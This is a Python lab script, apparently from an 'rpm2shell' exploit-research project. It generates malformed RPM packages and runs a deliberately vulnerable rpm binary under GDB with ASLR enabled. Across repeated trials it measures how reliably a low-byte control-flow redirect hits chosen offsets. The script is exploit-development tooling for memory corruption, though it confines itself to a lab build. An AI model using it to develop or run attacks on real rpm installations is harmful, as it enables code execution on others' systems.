#!/usr/bin/env python3
"""Throwaway: try a chosen low-byte redirect at two candidate offsets under
ASLR.  GDB only observes; no forced call, no LD_PRELOAD."""
import os, pathlib, re, shutil, subprocess, sys

REPO = pathlib.Path('/home/mesh-home/mishe-tauftauf2shell')
REAL = REPO / 'lab/frontier/rpm2shell/real'
VULN = REPO / 'lab/frontier/rpm2shell/build-vuln-plain/tools/rpm'
CFG = REPO / 'lab/frontier/rpm2shell/install-vuln/lib/rpm'
BASE = pathlib.Path('/tmp/r2s-redirect-run')
PROTECTED = ['/tmp/README', '/tmp/linkme', '/tmp/mydir', '/tmp/myscript.sh']
for p in PROTECTED:
    if os.path.lexists(p):
        sys.exit('REFUSE: %s exists' % p)


def cleanup():
    for p in ['/tmp/README', '/tmp/linkme', '/tmp/myscript.sh']:
        try: os.unlink(p)
        except FileNotFoundError: pass
    try: os.rmdir('/tmp/mydir')
    except (FileNotFoundError, OSError): pass


if BASE.exists(): shutil.rmtree(BASE)
BASE.mkdir()
fixtures = []
for length, idx in ((0x201, 0x200), (0x221, 0x220)):
    f = BASE / ('attack-%03x.rpm' % length)
    subprocess.run(['python3', '/tmp/r2s-mkredirect.py', str(length), str(idx), '0', str(f)],
                   check=True, stdout=subprocess.PIPE)
    fixtures.append((length, idx, f))

links = {}
for L in (42, 72):
    prefix = str(BASE / ('cfg%d-' % L))
    link = prefix + 'x' * (L - len(prefix))
    os.symlink(CFG, link)
    links[L] = link

trials = []
for length, idx, fixture in fixtures:
    for L in (42, 72):
        for n in range(15):
            db = BASE / ('db-%03x-%d-%02d' % (length, L, n)); db.mkdir()
            cleanup()
            log = BASE / ('gdb-%03x-%d-%02d.log' % (length, L, n))
            with log.open('w') as out:
                subprocess.run(['gdb', '-q', '-batch',
                    '-ex', 'set disable-randomization off',
                    '-ex', 'set environment RPM_CONFIGDIR %s' % links[L],
                    '-ex', 'directory %s' % (REPO / 'lab/frontier/rpm2shell/src/rpm/lib'),
                    '-x', '/tmp/r2s-redirect.gdb',
                    '--args', str(VULN), '--dbpath', str(db), '-i',
                    '--nodeps', '--noscripts', '--nodigest', '--nosignature',
                    '--nofiledigest', '--ignoresize', str(fixture)],
                    stdout=out, stderr=subprocess.STDOUT, timeout=90)
            text = log.read_text(errors='replace')
            cands = [(int(m.group(1), 16), int(m.group(2), 16))
                     for m in re.finditer(r'CAND off=(0x[0-9a-f]+) pre=0x[0-9a-f]+ delta=(0x[0-9a-f]+)', text)]
            offsets = next((l.split('=', 1)[1] for l in text.splitlines()
                            if l.startswith('OFFSETS=')), '')
            offs = [int(x, 16) for x in offsets.split(',') if x]
            exact = [(o, d) for o, d in cands if o == idx and d < 0x100]
            visited_zero = 0 in offs
            signal = 'SIGSEGV' if 'SIGSEGV' in text else ('SIGABRT' if 'SIGABRT' in text else 'other')
            trials.append((length, L, n, len(cands), exact, visited_zero, signal))
            print('len=%#x L=%d n=%02d cands=%d exact=%s visit0=%s sig=%s' %
                  trials[-1], flush=True)
cleanup()
hits = [t for t in trials if t[4] and t[5]]
print('EXACT_CANDIDATE_TRIALS=%d REFLECTED_VISITS=%d' %
      (sum(1 for t in trials if t[4]), len(hits)))
(BASE / 'summary.txt').write_text('\n'.join(map(str, trials)) + '\n')
